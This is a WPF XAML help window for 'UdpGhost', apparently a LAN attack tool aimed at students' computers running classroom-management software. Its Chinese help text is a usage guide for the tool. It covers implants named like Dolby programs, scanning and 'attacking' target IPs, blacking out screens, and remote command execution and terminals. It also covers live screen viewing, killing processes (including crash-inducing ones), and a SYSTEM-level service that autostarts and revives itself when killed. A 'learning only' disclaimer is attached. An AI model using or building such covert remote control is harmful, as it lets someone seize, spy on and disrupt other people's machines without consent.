<Window x:Class="UdpGhost.HelpWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="帮助文档 UdpGhost" Height="550" Width="600"
        WindowStartupLocation="CenterScreen"
        Background="Transparent"
        AllowsTransparency="True"
        WindowStyle="None">
    <Window.Resources>
        <Style x:Key="HackerButton" TargetType="Button">
            <Setter Property="Background" Value="#1F2937"/>
            <Setter Property="Foreground" Value="#00FF41"/>
            <Setter Property="BorderBrush" Value="#00FF41"/>
            <Setter Property="BorderThickness" Value="1"/>
            <Setter Property="FontFamily" Value="Consolas"/>
            <Setter Property="FontSize" Value="12"/>
            <Setter Property="Height" Value="32"/>
            <Setter Property="Padding" Value="12,0"/>
            <Setter Property="Cursor" Value="Hand"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border Background="{TemplateBinding Background}" BorderBrush="{TemplateBinding BorderBrush}" BorderThickness="{TemplateBinding BorderThickness}" CornerRadius="3">
                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Border>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
            <Style.Triggers>
                <Trigger Property="IsMouseOver" Value="True">
                    <Setter Property="Background" Value="#00FF41"/>
                    <Setter Property="Foreground" Value="#0D1117"/>
                </Trigger>
            </Style.Triggers>
        </Style>
    </Window.Resources>
    <Border CornerRadius="10" Background="#E60D1117" BorderBrush="#00FF41" BorderThickness="1.5">
        <Grid Margin="20">
            <Grid.RowDefinitions>
                <RowDefinition Height="Auto"/>
                <RowDefinition Height="*"/>
                <RowDefinition Height="Auto"/>
            </Grid.RowDefinitions>
            <!-- 标题 -->
            <StackPanel Grid.Row="0" Orientation="Horizontal" HorizontalAlignment="Center" Margin="0,0,0,15">
                <TextBlock Text="?" Foreground="#00FF41" FontSize="22" FontWeight="Bold" VerticalAlignment="Center"/>
                <TextBlock Text="帮助文档" Foreground="#00FF41" FontSize="20" FontWeight="Bold" FontFamily="Consolas" Margin="10,0,0,0" VerticalAlignment="Center"/>
            </StackPanel>
            <!-- 内容 -->
            <ScrollViewer Grid.Row="1" VerticalScrollBarVisibility="Auto" Foreground="#8B949E" FontFamily="Consolas" FontSize="11">
                <StackPanel>
                    <TextBlock Text="═══ 快速开始 ═══" Foreground="#00FF41" FontWeight="Bold" Margin="0,0,0,8"/>
                    <TextBlock Text="1. 确保被控端已运行 DolbyVision.exe 或 DolbyAccess.exe" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="2. 点击[扫描设备]发现局域网内的被控端" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="3. 选择设备后进行相应操作" Foreground="#8B949E" Margin="0,0,0,12"/>

                    <TextBlock Text="═══ 单学生连接 ═══" Foreground="#00FF41" FontWeight="Bold" Margin="0,0,0,8"/>
                    <TextBlock Text="• 扫描局域网学生端,选择目标后点击[连接]" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="• 连接成功后可单播发送:黑屏/解锁/发消息/关机/重启" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="• 频道号默认1,如需修改请在连接前设置" Foreground="#8B949E" Margin="0,0,0,12"/>

                    <TextBlock Text="═══ 指定IP攻击 ═══" Foreground="#00FF41" FontWeight="Bold" Margin="0,0,0,8"/>
                    <TextBlock Text="• 输入目标学生端IP(或从列表选择)" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="• 黑屏:约5秒后自动解除,支持自定义文字" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="• 发消息:20字以内,回车发送" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="• 发命令:远程执行程序(如notepad/calc)" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="• 关机/重启:向学生端发送极域协议指令" Foreground="#8B949E" Margin="0,0,0,12"/>

                    <TextBlock Text="═══ 屏幕监控 ═══" Foreground="#00FF41" FontWeight="Bold" Margin="0,0,0,8"/>
                    <TextBlock Text="• 扫描DolbyVision/DolbyAccess发送端" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="• 双击设备或点击[观看]实时查看屏幕" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="• 远程控制区:关机/重启/命令/CMD终端/PS终端" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="• 恶搞功能:Win10/Win11 OOBE动画全屏播放" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="• 封禁:全屏显示ban.jpg 5秒" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="• 进程管理:查看/结束被控端进程" Foreground="#8B949E" Margin="0,0,0,12"/>

                    <TextBlock Text="═══ 服务模式(SYSTEM权限) ═══" Foreground="#00FF41" FontWeight="Bold" Margin="0,0,0,8"/>
                    <TextBlock Text="• 点击[安装服务]在被控端安装Windows服务" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="• 服务以SYSTEM权限运行,开机自启,被杀5秒自动重启" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="• 普通模式被杀后,可通过SYSTEM模式[重启普通模式]" Foreground="#8B949E" Margin="0,0,0,12"/>

                    <TextBlock Text="═══ DolbyAccess(ANS模式) ═══" Foreground="#00FF41" FontWeight="Bold" Margin="0,0,0,8"/>
                    <TextBlock Text="• 运行后自动安装服务,无需手动操作" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="• 普通模式被杀后自动重启(1分钟内最多3次)" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="• 复活失败后进入SYSTEM fallback模式,可远程手动操作" Foreground="#8B949E" Margin="0,0,0,12"/>

                    <TextBlock Text="═══ 注意事项 ═══" Foreground="#FF6B6B" FontWeight="Bold" Margin="0,0,0,8"/>
                    <TextBlock Text="• 本程序仅供学习研究使用" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="• 黑屏功能约5秒后学生端自动解除" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="• 安装服务需要被控端以管理员权限运行" Foreground="#8B949E" Margin="0,0,0,4"/>
                    <TextBlock Text="• 杀系统关键进程(如csrss)会导致被控端蓝屏" Foreground="#8B949E" Margin="0,0,0,4"/>
                </StackPanel>
            </ScrollViewer>
            <!-- 关闭按钮 -->
            <Button Grid.Row="2" Content="[关闭]" Style="{StaticResource HackerButton}" Width="100" HorizontalAlignment="Center" Margin="0,15,0,0" Click="Close_Click"/>
        </Grid>
    </Border>
</Window>
